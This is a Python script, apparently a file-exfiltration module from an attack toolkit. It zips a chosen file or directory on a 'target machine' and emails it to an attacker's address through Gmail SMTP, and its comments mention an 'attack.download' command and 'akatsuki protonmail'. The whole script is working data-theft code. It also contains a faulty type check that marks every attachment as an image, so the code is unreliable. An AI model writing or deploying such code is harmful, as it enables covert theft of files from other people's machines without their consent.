#I want to create a script that allows me to send emails

#Useful libraries that I would be working with -->
from zipfile import ZipFile
from email.message import EmailMessage
import smtplib
import imghdr
import os
import shutil

#Declaring the functions
def email_(file, subject = None, content = None, sender_ = None, receiver = None, password = None):
    if content:
        content = f"\n\n{content}"
    else:
        content = ""
    try:
        sender = sender_
        recipient = [receiver] #You can add more emails to this list depending how many people you want to send an email

        password = password
        message = EmailMessage()
        message["Subject"] = f"{subject}"
        message["From"] = "Akatsuki Soshiki"
        message["To"] = recipient
        if file:
            message.set_content(f"{file} successfully sent from target machine {content}")
        else:
            message.set_content(f"Successfully sent from target machine {content}")

        #This sends the attachment to the specified email
        if file:
            with open(file, "rb") as f:
                fileData = f.read()
                if ".jpg" or ".png" in file:
                    fileMainType = "image"
                    fileSubType = imghdr.what(f.name)
                else:
                    fileMainType = "application"
                    fileSubType = "octet-stream"
                fileName = f.name

            message.add_attachment(fileData, 
                                    maintype = str(fileMainType),
                                    subtype = str(fileSubType),
                                    filename = fileName) #This sends the specified attachment

        #This handles the sending of the email
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(sender, password)
            smtp.send_message(message)
        stat = f"{file} successfully zipped, sent to the email and deleted on target machine"
    except Exception as e:
        stat = f"{file} wasn't sent due to [{e}]"
    print(stat)
    return stat


#This property allows us to downloads file from the target machine
def emailer(file, subject = None, content = None, sender_ = None, receiver = None, password = None):
    try:
        #This session checks if its a file or directory, then zips it and sends it to the specified emails
        if os.path.isdir(file) == True:
            shutil.make_archive(f"{file}", 'zip', f"{file}")

            d = email_(f"{file}.zip", subject, content, sender_, receiver, password) #This part the zip file will be sent to akatsuki protonmail
                
            os.remove(f"{file}.zip")

            return d
        #This session checks if its a file or directory, then zips it and sends it to the specified emails
        elif os.path.isfile(file) == True:
            for id, i in enumerate(file):
                if i == ".":
                    filename = file[:id]
            with ZipFile(f'{filename}.zip', 'w') as zipf:
                zipf.write(f"{file}")

            d = email_(f"{filename}.zip", subject, content, sender_, receiver, password) #This part the zip file will be sent to akatsuki protonmail
                
            os.remove(f"{filename}.zip")
            
            return d
        else:
            return f"Couldn't find {file}, cross check the spelling and use the correct syntax --> attack.download filename"

    except Exception as e:
        return f"An error occurred when trying to email the file due to [{e}]"


if __name__ == "__main__":
    print("File Emailer \n")
    
    file = "filename.ext"
    subject = "Email subject"
    content = "Email content"
    sender_ = "sender-email-address"
    receiver = "receiver-email-address"
    password = "sender-email-password" 
    stat = emailer(file, subject, content, sender_, receiver, password)

    print("\nExecuted successfully!!")
